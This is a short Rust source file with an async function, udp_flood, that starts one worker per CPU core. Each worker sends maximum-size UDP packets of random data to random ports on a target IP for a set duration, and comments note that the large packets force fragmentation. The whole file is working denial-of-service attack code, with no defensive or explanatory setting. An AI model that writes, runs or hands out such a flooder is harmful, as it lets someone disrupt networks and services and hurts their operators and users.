use std::sync::Arc;
use tokio::net::UdpSocket;
use tokio::time::Instant;
use rand::{Rng, SeedableRng};
use rand::rngs::StdRng;

pub async fn udp_flood(target_ip: &str, duration_secs: u64) {
    let start_time = Instant::now();
    let socket = match UdpSocket::bind("0.0.0.0:0").await {
        Ok(s) => Arc::new(s),
        Err(_) => return,
    };

    println!("Starting UDP Flood on {}", target_ip);

    // Spawn multiple workers
    let mut handles = vec![];
    for _ in 0..num_cpus::get() {
        let socket_clone = socket.clone();
        let target = target_ip.to_string();
        
        handles.push(tokio::spawn(async move {
            let mut rng = StdRng::from_entropy();
            let mut buf = [0u8; 65507]; // Max UDP size to force fragmentation (Variant 2)
            
            while start_time.elapsed().as_secs() < duration_secs {
                // Randomize Data
                rng.fill(&mut buf[..]);
                
                // Variant 1: Random Port
                let port = rng.gen_range(1024..65535);
                let dest = format!("{}:{}", target, port);
                
                // Sending full buffer forces fragmentation (Variant 2) if > MTU
                let _ = socket_clone.send_to(&buf, &dest).await;
            }
        }));
    }

    for h in handles {
        let _ = h.await;
    }
}
